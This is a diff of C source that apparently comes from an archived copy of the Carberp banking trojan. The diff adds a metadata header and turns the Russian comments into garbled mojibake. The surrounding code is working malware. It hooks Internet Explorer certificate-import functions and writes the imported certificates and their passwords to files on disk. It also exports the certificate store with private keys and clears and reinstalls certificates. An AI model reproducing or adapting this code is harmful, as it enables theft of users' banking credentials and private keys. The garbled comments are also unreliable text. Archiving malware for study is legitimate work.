@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <wininet.h>
 
@@ -24,19 +35,19 @@
 
 #include "coocksol.h"
 
-//функции работы с сертификатами
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 struct DataSert 
 {
-	CRYPT_DATA_BLOB pfxBlob; //сертификат
-	char* name; //имя хранилища
+	CRYPT_DATA_BLOB pfxBlob; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	char* name; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	WCHAR* password;
-	int count; //количество сертификатов в хранилище
+	int count; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 };
 
-char* sert_my = "My"; //имя хранилища
-WCHAR* sert_pass = L"pass"; //пароль для шифрования (можно любой)
-char* fileExport = "c:\\cert.pfx"; //имя файла куда сохраняется сертификат
-char* filePassword = "c:\\cert.psw"; //имя файла куда сохраняется файл
+char* sert_my = "My"; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+WCHAR* sert_pass = L"pass"; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ)
+char* fileExport = "c:\\cert.pfx"; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+char* filePassword = "c:\\cert.psw"; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 bool GetSert( DataSert& );
 bool PutSert( DataSert& );
@@ -45,9 +56,9 @@ void SaveSert( DataSert&, const char* );
 bool LoadSert( DataSert&, const char* );
 bool ClearSerts( const char* nameStore );
 bool DelExportSerts( char* nameStore, WCHAR* password );
-bool DelExportSerts(); //удаление экспортируемых сертификтов по умолчанию
+bool DelExportSerts(); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-//все функции которые мы будем хучить для IE
+//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ IE
 
 typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
 PShowWindow    Real_ShowWindow;
@@ -72,8 +83,8 @@ HCURSOR WINAPI Hook_SetCursor(HCURSOR hCursor)
 {
 	DbgMsg("Hook_SetCursor",0,"FUCK!!!!!!!!!!!");
 
-	// Заменяем курсор на стандартную стрелочку
-	// и вызываем оригинальную функцию
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	HCURSOR cur = LoadCursor(NULL, IDC_ARROW);
 	return Real_SetCursor(cur);
 }
@@ -133,12 +144,12 @@ HCERTSTORE WINAPI Hook_PFXImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR passwor
 	HCERTSTORE certstore = Real_PFXImportCertStore(data, password, flags);
 	if(certstore != NULL && (flags & 0x10000000) == 0 && data && data->cbData > 0 && data->pbData != NULL)
 	{
-		//сохраняем сертификат
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		DataSert dataSert;
 		dataSert.pfxBlob.pbData = data->pbData;
 		dataSert.pfxBlob.cbData = data->cbData;
 		SaveSert( dataSert, fileExport );
-		//сохраняем пароль
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		HANDLE fout = (HANDLE)pCreateFileA( filePassword, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0 );
 		if( fout != INVALID_HANDLE_VALUE ) 
 		{
@@ -156,8 +167,8 @@ HCERTSTORE WINAPI Hook_PFXImportCertStore(CRYPT_DATA_BLOB *data, LPCWSTR passwor
 
 bool WINAPI IsInternetExplorer()
 {
-	// Функция вернёт истину если она вызвана в процессе
-	// интернет експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );
 
@@ -167,7 +178,7 @@ bool WINAPI IsInternetExplorer()
 	}
 
 	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
-//	DbgMsgW(L"эксплорер ли это?",1,ModulePath);
+//	DbgMsgW(L"пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ?",1,ModulePath);
 	DWORD dwProcessHash = GetNameHash( ModulePath );
 
 	
@@ -177,7 +188,7 @@ bool WINAPI IsInternetExplorer()
 		 dwProcessHash == 0xC032B37E ||		//ieuser.exe //test for Vista
 		 dwProcessHash == 0x490A0972*/ )		// explorer.exe
 	{
-//	DbgMsgW(L"АГА Эксплорер",1,ModulePath);
+//	DbgMsgW(L"пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ",1,ModulePath);
 		MemFree( ModulePath );
 		return true;
 	}
@@ -189,9 +200,9 @@ bool WINAPI IsInternetExplorer()
 
 bool HookInternetExplorer()
 {
-	// функция вешает хуки на базовые функции которые использует
-	// Internet Explorer для загрузки документов
-	// Работает только в случае вызова из процесса интернет експлорера
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// Internet Explorer пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	if ( !IsInternetExplorer() )
 	{
@@ -250,14 +261,14 @@ bool GetSert( DataSert& dataSert )
 	HANDLE hstore = pCertOpenSystemStoreA( NULL, dataSert.name );
 	if( hstore != NULL )
 	{
-		dataSert.count = 0; //количество сертефикатов
+		dataSert.count = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		PCCERT_CONTEXT certContext = 0;
 		while( (certContext = (PCCERT_CONTEXT)pCertEnumCertificatesInStore( hstore, certContext ) ) != NULL)
 			dataSert.count++;
 
 		if( dataSert.count > 0 )
 		{
-			//Получаем размер хранилища.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			dataSert.pfxBlob.pbData = NULL;
 			dataSert.pfxBlob.cbData = 0;
 			if( pPFXExportCertStoreEx( hstore, &dataSert.pfxBlob, dataSert.password, 0, EXPORT_PRIVATE_KEYS) != FALSE )
@@ -352,10 +363,10 @@ bool DelExportSerts( char* nameStore, WCHAR* password )
 	dataSert.pfxBlob.cbData = 0;
 	dataSert.name = nameStore;
 	dataSert.password = password;
-	if( GetSert(dataSert) ) //извлекаем сертификаты
+	if( GetSert(dataSert) ) //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
-		ClearSerts(dataSert.name); //удаляем все
-		if( PutSert(dataSert) ) //ставим на место, в этом случае установятся только экспортируемые
+		ClearSerts(dataSert.name); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+		if( PutSert(dataSert) ) //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			ret = true;
 		}
